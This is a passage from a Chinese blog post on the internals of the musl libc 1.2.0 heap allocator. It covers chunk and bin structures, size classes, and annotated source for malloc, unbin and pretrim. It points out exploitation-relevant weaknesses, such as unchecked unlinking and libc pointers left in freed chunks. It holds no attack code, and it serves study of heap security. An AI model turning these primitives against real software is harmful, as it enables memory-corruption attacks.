<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、1.2.0及以前版本                           1.数据结构                           (1)chunk结构       12345&#x2F;&#x2F;v1.2.0 定义在src&#x2F;internal&#x2F;malloc_impl.h中struct chunk &amp;#123;    size_t psize, csize; &#x2F;&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="Musl从0开始">
<meta property="og:url" content="http://pig-007.github.io/2022/01/22/Musl%E4%BB%8E0%E5%BC%80%E5%A7%8B/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="一、1.2.0及以前版本                           1.数据结构                           (1)chunk结构       12345&#x2F;&#x2F;v1.2.0 定义在src&#x2F;internal&#x2F;malloc_impl.h中struct chunk &amp;#123;    size_t psize, csize; &#x2F;&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171127046.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171857586.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171832664.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171936093.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181131379.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181136514.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181204446.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203181141533.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203172053962.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171413463.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171434757.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171438716.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171442484.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171447956.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171531940.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171449585.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816194459069.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195302098.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195412866.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192915034.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822205832570.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230822221035821.png">
<meta property="article:published_time" content="2022-01-22T02:25:33.000Z">
<meta property="article:modified_time" content="2023-08-22T14:10:56.697Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="Musl">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202171127046.png"><title>Musl从0开始 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/01/22/Musl%E4%BB%8E0%E5%BC%80%E5%A7%8B/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Musl从0开始</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-08-22</span></span></div></header><div class="post-body">
        <h1 id="一、1-2-0及以前版本"   >
          <a href="#一、1-2-0及以前版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、1-2-0及以前版本" class="headerlink" title="一、1.2.0及以前版本"></a>一、1.2.0及以前版本</h1>
      
        <h2 id="1-数据结构"   >
          <a href="#1-数据结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-数据结构" class="headerlink" title="1.数据结构"></a>1.数据结构</h2>
      
        <h3 id="1-chunk结构"   >
          <a href="#1-chunk结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunk结构" class="headerlink" title="(1)chunk结构"></a>(1)chunk结构</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 定义在src/internal/malloc_impl.h中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; <span class="comment">// 相当于 glibc 的 prev size 和 size</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>①不重用psize字段</p>
<p>②psize和size都有inuse标志位，分别代表前一个chunk和当前chunk的使用状态。</p>

        <h3 id="2-堆管理结构mal"   >
          <a href="#2-堆管理结构mal" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-堆管理结构mal" class="headerlink" title="(2)堆管理结构mal"></a>(2)堆管理结构mal</h3>
      <p>类似于arena，记录堆中的相关状态，bins结构体等</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  定义在src/malloc/malloc.c中</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap; <span class="comment">//64位无符号整数binmap</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-bitmap"   >
          <a href="#3-bitmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-bitmap" class="headerlink" title="(3)bitmap:"></a>(3)bitmap:</h3>
      <p><code>binmap</code>记录每个 bin 是否为非空，若对应某个比特位为 1，则表示对应的 bin 为非空，存在chunk</p>
<p>在unbin函数操作过程中，如果操作的chunk(C)的prev和next指针相等，就会将对应的bin的bitmap设置为0，使其处于置空的状态。</p>

        <h3 id="4-bins"   >
          <a href="#4-bins" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-bins" class="headerlink" title="(4)bins"></a>(4)bins</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 定义在src/internal/malloc_impl.h中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>构成类似unsortedbin的双向循环链表，当链表为空时，<code>head</code>和<code>tail</code>指针等于 0 或者指向链表头部自身。</p>
<p>每个bin存储的chunk范围如下</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">bin 下标 i</th>
<th align="left">chunk 大小个数</th>
<th align="center">chunk 大小范围</th>
<th align="center">下标 i 与 chunk 大小范围的关系</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0-31</td>
<td align="left">1</td>
<td align="center">0x20 – 0x400</td>
<td align="center">(i+1) * 0x20</td>
</tr>
<tr>
<td align="left">32-35</td>
<td align="left">8</td>
<td align="center">0x420 – 0x800</td>
<td align="center">(0x420+(i-32) <em>0x100) ~ (0x500+(i-32)</em> 0x100)</td>
</tr>
<tr>
<td align="left">36-39</td>
<td align="left">16</td>
<td align="center">0x820 – 0x1000</td>
<td align="center">(0x820+(i-36) <em>0x200) ~ (0x1000+(i-36)</em> 0x200)</td>
</tr>
<tr>
<td align="left">40-43</td>
<td align="left">32</td>
<td align="center">0x1020 – 0x2000</td>
<td align="center">(0x1020+(i-40) <em>0x400) ~ (0x1400+(i-40)</em> 0x400)</td>
</tr>
<tr>
<td align="left">44-47</td>
<td align="left">64</td>
<td align="center">0x2020 – 0x4000</td>
<td align="center">(0x2020+(i-44) <em>0x800) ~ (0x2800+(i-44)</em> 0x800)</td>
</tr>
<tr>
<td align="left">48-51</td>
<td align="left">128</td>
<td align="center">0x4020 – 0x8000</td>
<td align="center">(0x4020+(i-48) <em>0x1000) ~ (0x5000+(i-48)</em> 0x1000)</td>
</tr>
<tr>
<td align="left">52-55</td>
<td align="left">256</td>
<td align="center">0x8020 – 0x10000</td>
<td align="center">(0x8020+(i-52) <em>0x2000) ~ (0xa000+(i-52)</em> 0x2000)</td>
</tr>
<tr>
<td align="left">56-59</td>
<td align="left">512</td>
<td align="center">0x10020 – 0x20000</td>
<td align="center">(0x10020+(i-56) <em>0x4000) ~ (0x14000+(i-56)</em> 0x4000)</td>
</tr>
<tr>
<td align="left">60-62</td>
<td align="left">1024</td>
<td align="center">0x20020 – 0x38000</td>
<td align="center">(0x20020+(i-60) <em>0x8000) ~ (0x28000+(i-60)</em> 0x8000)</td>
</tr>
<tr>
<td align="left">63</td>
<td align="left">无限</td>
<td align="center">0x38000 以上</td>
<td align="center">0x38000 ~</td>
</tr>
</tbody></table></div>
<p>前 32 个 bin 类似 fastbin和smallbin，每个 bin 只对应一种大小的 chunk，但是也是双向循环链表，第一个释放到bins中的chunk都会使得next和prev指针带上libc地址。</p>
<p>后面的则类似largebin，对应多种范围大小的chunk。</p>

        <h2 id="2-维护方式"   >
          <a href="#2-维护方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-维护方式" class="headerlink" title="2.维护方式"></a>2.维护方式</h2>
      <p>在 64 位系统下 chunk 大小是以 32 字节对齐的，这与 glibc 16 字节对齐不同，故 chunk 大小最小为 0x20 字节，然后按 0x40、0x60、0x80… 逐渐递增，不共用psize位，所以每次都会将申请的size+0x10。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x10)-&gt;0x20</span><br><span class="line">malloc(0x11)-&gt;0x40</span><br><span class="line">malloc(0x2f)-&gt;0x40</span><br><span class="line">malloc(0x30)-&gt;0x40</span><br><span class="line">malloc(0x31)-&gt;0x60</span><br></pre></td></tr></table></div></figure>

<p>维护链表的方式是 FILO（从链表首部取出 chunk，从尾部插入 chunk），并且都是双向循环链表</p>
<p>没有实现如<code>__malloc_hook</code>、<code>__free_hook</code>之类的 hook 函数</p>

        <h2 id="3-关键函数"   >
          <a href="#3-关键函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-关键函数" class="headerlink" title="3.关键函数"></a>3.关键函数</h2>
      
        <h3 id="1-mallco"   >
          <a href="#1-mallco" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-mallco" class="headerlink" title="(1)mallco"></a>(1)mallco</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调整n大小，对齐0x20</span></span><br><span class="line">	<span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果n大于MMAP_THRESHOLD (0x38000)，使用 mmap</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (base == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		c = (<span class="keyword">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">		<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算对应的binmap下标i</span></span><br><span class="line">	i = bin_index_up(n);</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//查找binmap</span></span><br><span class="line">		<span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果bin均为空，那么调用expand_heap函数延展堆空间，生成新的chunk返回</span></span><br><span class="line">		<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">			c = expand_heap(n);</span><br><span class="line">			<span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">				c = PREV_CHUNK(c);</span><br><span class="line">				NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">					x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取大小最接近n(size)的可用bin下标j</span></span><br><span class="line">		j = first_set(mask);</span><br><span class="line">		lock_bin(j);</span><br><span class="line">		c = mal.bins[j].head;</span><br><span class="line">        <span class="comment">//BIN_TO_CHUNK不知道什么函数</span></span><br><span class="line">		<span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;、</span><br><span class="line">            <span class="comment">//使用 pretrim判断c的大小和需求的size(n)，相差太大就切割</span></span><br><span class="line">            <span class="comment">//否则使用 unlock从链表中取出</span></span><br><span class="line">			<span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">			unlock_bin(j);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_bin(j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    <span class="comment">//切割之后回收 c 中大小超过 n 的部分</span></span><br><span class="line">	trim(c, n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="详细步骤："   >
          <a href="#详细步骤：" class="heading-link"><i class="fas fa-link"></i></a><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4>
      <ul>
<li><p>调整 n，对齐0x20</p>
</li>
<li><p> 如果 n &gt; MMAP_THRESHOLD (0x38000)，使用 mmap 创建一块大小为 n 的内存，返回给用户。</p>
</li>
<li><p>如果 n &lt;= MMAP_THRESHOLD (0x38000)，计算 n 对应的 bin 下标 i，查找 binmap</p>
<ul>
<li><p>如果所有的可用 bin 均为空，调用expand_heap函数延展堆空间，生成一个新的 chunk返回</p>
</li>
<li><p>如果存在非空的可用 bin，选择大小最接近 n 的 bins[j]，得到 bin 链表首部的 chunk c<br>如果符合 pretrim 条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c，最后将分割剩下的chunk进入trim函数回收，将c返回给用户。</p>
</li>
</ul>
</li>
</ul>
<p>至于那个unlock_bin好像是同步用的，应该是多线程防止竞争读写吧，不太懂</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="comment">/* Synchronization tools */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (libc.threads_minus_1)</span><br><span class="line">		<span class="keyword">while</span>(a_swap(lk, <span class="number">1</span>)) __wait(lk, lk+<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (lk[<span class="number">0</span>]) &#123;</span><br><span class="line">		a_store(lk, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (lk[<span class="number">1</span>]) __wake(lk, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	lock(mal.bins[i].lock);</span><br><span class="line">	<span class="keyword">if</span> (!mal.bins[i].head)</span><br><span class="line">		mal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	unlock(mal.bins[i].lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="①unbin"   >
          <a href="#①unbin" class="heading-link"><i class="fas fa-link"></i></a><a href="#①unbin" class="headerlink" title="①unbin"></a>①unbin</h4>
      <p>类似于unlink的解链操作，无任何检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">//解链</span></span><br><span class="line">	c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">//设置 INUSE 标志位，双重标志位都会设置</span></span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②pretrim"   >
          <a href="#②pretrim" class="heading-link"><i class="fas fa-link"></i></a><a href="#②pretrim" class="headerlink" title="②pretrim"></a>②pretrim</h4>
      <p>切割chunk，需要满足一定条件才会进行切割操作</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="comment">/* pretrim - trims a chunk _prior_ to removing it from its bin.</span></span><br><span class="line"><span class="comment"> * Must be called with i as the ideal bin for size n, j the bin</span></span><br><span class="line"><span class="comment"> * for the _free_ chunk self, and bin j locked. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 条件 1:j(大小最接近size的可用bin下标)大于 40</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 条件 2: j(大小最接近size的可用bin下标)与i(计算出来的bin下标)相隔 3 个 bin 或以上，</span></span><br><span class="line">    <span class="comment">// 或者j(大小最接近size的可用bin下标)等于63且size相差大于 MMAP_THRESHOLD(0x38000)</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">		<span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//条件3: 